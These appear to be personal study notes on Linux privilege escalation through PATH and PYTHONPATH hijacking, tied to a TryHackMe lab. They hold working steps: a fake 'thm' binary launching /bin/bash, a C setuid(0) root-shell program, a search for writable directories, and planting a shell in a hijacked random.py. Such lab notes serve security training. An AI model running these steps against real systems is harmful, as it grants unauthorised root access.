Make sure the $PATH$ is in **CORRECT ORDER**!
```sh
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

If not then change it to this order :-
```sh
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

---
Read this, [TryHackMe | Linux Privilege Escalation](https://tryhackme.com/room/linprivesc)

```sh
export PATH=/tmp:$PATH
# OR
export PATH=.:$PATH       # This searches for file from the current directory first
```

```sh
echo '/bin/bash' > thm
chmod 777 thm
```

**For Python :-**
```python
#!/usr/bin/python3

import os
import sys

try:
	os.system("thm")
except:
    sys.exit()
```


**For C :-**
```C
#include<unistd.h>
void main(){
setuid(0);
setgid(0);
system("/bin/sh");
}
```


```sh
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

---
# PYTHONPATH Variable
Check for modules getting imported in the file
```python
# Example
import random                                                                                                      

poem = """The sun was shining on the sea, 
Shining with all his might:
He did his very best to make          
The billows smooth and bright —
And this was odd, because it was
The middle of the night."""  

for i in range(10):
    line = random.choice(poem.split("\n"))
```

![[1_EX3c8zeaNX7jTD2LJ8B1cg.webp]]

So it’s clear that we’ve got the write privilege in the **Top/highest** (the directory from where the script is being executed) Precedence Path of the `PYTHONPATH` variable.
Create a `random.py` file in the same directory of the file & put up a **shell** in it!
OR
If you can't create a file in that directory, check if the *imported module can be edited* or not!
